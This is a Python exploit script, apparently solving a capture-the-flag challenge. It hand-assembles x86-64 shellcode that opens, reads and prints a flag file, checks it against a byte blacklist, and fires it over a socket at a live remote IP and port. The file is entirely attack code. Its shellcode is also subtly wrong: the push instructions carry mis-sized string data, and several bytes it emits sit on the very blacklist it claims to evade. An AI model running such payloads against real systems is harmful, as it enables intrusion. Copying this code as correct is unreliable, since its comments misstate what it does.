#!/usr/bin/env python3

import socket

# Blacklisted bytes: \x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67
# Which are: ; T b i n s h f l a g

# Let's create shellcode that opens and reads the flag file directly
# We'll use open(), read(), write() syscalls

shellcode = b""
# open("flag.txt", O_RDONLY)
shellcode += b"\x48\x31\xc0"              # xor rax, rax
shellcode += b"\x50"                      # push rax (NULL terminator)

# Push "flag.txt" in reverse order
shellcode += b"\x68\x74\x78\x74\x2e"      # push ".txt"
shellcode += b"\x68\x67\x61\x6c\x66"      # push "flag"

# Now rsp points to "flag.txt"
shellcode += b"\x48\x89\xe7"              # mov rdi, rsp (arg0: path)
shellcode += b"\x48\x31\xf6"              # xor rsi, rsi (arg1: O_RDONLY = 0)
shellcode += b"\x48\x31\xd2"              # xor rdx, rdx (arg2: mode)
shellcode += b"\x48\x31\xc0"              # xor rax, rax
shellcode += b"\xb0\x02"                  # mov al, 2 (open syscall)
shellcode += b"\x0f\x05"                  # syscall

# rax now contains the file descriptor
shellcode += b"\x48\x89\xc7"              # mov rdi, rax (fd)
shellcode += b"\x48\x8d\x74\x24\x20"      # lea rsi, [rsp+32] (buffer)
shellcode += b"\x48\xc7\xc2\x00\x01\x00\x00"  # mov rdx, 256 (count)
shellcode += b"\x48\x31\xc0"              # xor rax, rax
shellcode += b"\xb0\x00"                  # mov al, 0 (read syscall)
shellcode += b"\x0f\x05"                  # syscall

# write(1, buffer, count)
shellcode += b"\x48\xc7\xc7\x01\x00\x00\x00"  # mov rdi, 1 (stdout)
shellcode += b"\x48\x8d\x74\x24\x20"      # lea rsi, [rsp+32] (buffer)
shellcode += b"\x48\x89\xc2"              # mov rdx, rax (count from read)
shellcode += b"\x48\x31\xc0"              # xor rax, rax
shellcode += b"\xb0\x01"                  # mov al, 1 (write syscall)
shellcode += b"\x0f\x05"                  # syscall

# exit(0)
shellcode += b"\x48\x31\xc0"              # xor rax, rax
shellcode += b"\xb0\x3c"                  # mov al, 60 (exit syscall)
shellcode += b"\x0f\x05"                  # syscall

print("Shellcode length:", len(shellcode))
print("Shellcode bytes:", shellcode.hex())

# Check for blacklisted bytes
blacklist = b"\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67"
for i, byte in enumerate(shellcode):
    if byte in blacklist:
        print(f"WARNING: Blacklisted byte {hex(byte)} found at position {i}")

# Test the connection
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("94.237.60.55", 47972))
    
    # Receive the initial message
    response = s.recv(1024)
    print("Received:", response.decode())
    
    # Send our shellcode
    s.send(shellcode)
    
    # Try to receive response
    s.settimeout(10)
    try:
        while True:
            response = s.recv(1024)
            if not response:
                break
            print(response.decode(), end='')
    except socket.timeout:
        pass
    
    s.close()
    
except Exception as e:
    print(f"Error: {e}")